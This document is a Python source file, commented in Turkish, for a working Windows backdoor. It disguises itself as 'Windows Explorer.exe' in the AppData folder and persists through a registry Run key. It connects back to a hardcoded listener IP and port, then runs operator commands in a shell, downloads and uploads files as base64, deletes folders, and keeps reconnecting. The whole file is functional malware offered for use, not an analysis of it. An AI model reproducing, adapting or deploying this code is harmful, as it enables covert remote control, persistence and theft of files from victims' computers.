#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import socket
import subprocess
import json
import base64
import time
import platform
from termcolor import colored
import os
import shutil
import sys

class Backdoor:
    def __init__(self,ip,port):
        self.ip=ip
        self.port=port
        self.connection=None
        if platform.system() == "Windows":
            self.persistent()

    def persistent(self):
        backdoor_path=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(backdoor_path):
            shutil.copyfile(sys.executable,backdoor_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v guncelleme /t REG_SZ /d "'+backdoor_path+'"',shell=True)

    def baglanti(self):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((self.ip,self.port))
        try:
            self.gonder(socket.gethostname())
        except socket.error as e:
            self.gonder(self.text_color("[-] İstemci bilgisayar adı sunucuya gönderilemiyor \n[-] Hata mesajı:"+str(e),2))

    def text_color(self, mesaj, durum):
        if durum == 1:
            return colored(mesaj, "green")
        elif durum == 2:
            return colored(mesaj, "red")
        elif durum == 3:
            return colored(mesaj, "blue")

    def gonder(self, veri):
        json_veri = json.dumps(veri)
        self.connection.send(str.encode(json_veri))


    def al(self):
        json_veri = ""
        while True:
            try:
                json_veri = json_veri + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_veri)
            except ValueError:
                continue

    def system_komut_calistir(self,komut):
        try:
            sonuc = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            sonuc_byte = sonuc.stdout.read() + sonuc.stderr.read()
            return sonuc_byte.decode("utf-8", errors="replace")
        except UnicodeDecodeError as e:
            return  self.text_color("[-] Komut işlenemedi! \n[-] Hata mesajı:"+str(e),2)
        except Exception as e:
            return  self.text_color("[-] Komut işlenemedi! \n[-] Hata mesajı:"+str(e),2)


    def dizindegistir(self,dizin):
        try:
            os.chdir(dizin)
            return self.text_color("[+] '" + str(os.getcwd()) + "' dizinine gecis yapildi",1)
        except:
            return self.text_color("[-] Geçersiz dizin! ",1)

    def klasormu(self,yol):
        if os.path.isdir(yol):
            try:
                shutil.rmtree(yol)
                return self.text_color("[+] '" + str(yol) + "' klasörü başarıyla silindi",1)
            except:
                return self.text_color("[-] '" + str(yol) + "' klasörü silinemedi!",1)
        elif os.path.isfile(yol):
            return False


    def dosya_kontrol(self,file):
        return os.path.isfile(path=file)

    def dosya_oku(self,dosya):
        if self.dosya_kontrol(dosya):
            try:
                with open(dosya,"rb") as f:
                    return str(base64.b64encode(f.read()),"utf-8")
            except Exception as e:
                return self.text_color("[-] Dosya indirme işlemi başarısız!"+"\n[-] Hata mesajı:"+str(e),2)
        else:
            return self.text_color("[-] '"+ str(dosya)+ "' adında bir dosya bulunmamaktadır!",2)


    def dosya_yaz(self,dosya,icerik):
        try:
            with open(dosya,"wb") as file:
                file.write(base64.b64decode(icerik))
                return self.text_color("[+] Dosya başarıyla yüklendi",1)
        except Exception as e:
            return self.text_color("[-] Dosya yükleme işlemi başarısız!"+"\n[-] Hata mesajı:"+str(e),2)

    def komut_calistir(self):
        try:
            self.connection.recv(10)
        except Exception as e:
            print(self.text_color("[-] Server ile iletişim başlatılamadı",2))
            print(self.text_color("[-] Hata mesajı:"+str(e),2))

        self.gonder(str(os.getcwd()) + " >> ")

        while True:
            komut=self.al()
            try:
                if komut[0]=="quit":
                    self.gonder(" ")
                    self.connection.close()
                    break

                elif komut[0]=="cd" and len(komut) > 1:
                    sonuc=self.dizindegistir(komut[1])
                elif komut[0]=="download":
                    if len(komut)>1:
                        sonuc=self.dosya_oku(komut[1])
                    else:
                        sonuc=self.text_color("[-] Lütfen indireceğiniz dosyayı belirtin!",2)
                elif komut[0]=="upload":
                    sonuc=self.dosya_yaz(komut[1],komut[2])
                elif komut[0]=="del" and platform.system()=="Windows":
                    sonuc=self.klasormu(komut[1])
                    if not sonuc:
                        sonuc = self.system_komut_calistir(' '.join(komut))
                        if not sonuc:
                            sonuc = " "
                elif komut[0] == "getcwd":
                    sonuc = " "
                else:
                    sonuc=self.system_komut_calistir(' '.join(komut))
                    if not sonuc:
                        sonuc=" "

            except Exception as e:
                 sonuc = self.text_color("[-] Yürütme komutu sırasında hata",2)
                 sonuc+=self.text_color("[-] Hata mesajı:"+str(e),2)

            if komut[0]=="download":
                self.gonder(sonuc)
            elif sonuc and komut[0]!="quit":
                self.gonder(sonuc+"\n\n"+self.text_color(str(os.getcwd())+" >> ",3))

def main():
    listenerIP="192.168.0.30"
    listenerPort=2019
    backdoor = Backdoor(listenerIP,listenerPort)
    while True:
        try:
            backdoor.baglanti()
        except Exception as e:
            print(backdoor.text_color("[-] Soket bağlantılarında hata",2))
            print(backdoor.text_color("[-] Hata mesajı:"+str(e),2))
            time.sleep(5)
        else:
            break
    try:
        backdoor.komut_calistir()
    except Exception as e:
        print(backdoor.text_color("[-] Main hatası",2))
        print(backdoor.text_color("[-] Hata mesajı:"+str(e),2))
    backdoor.connection.close()

if __name__ == '__main__':
    while True:
        main()
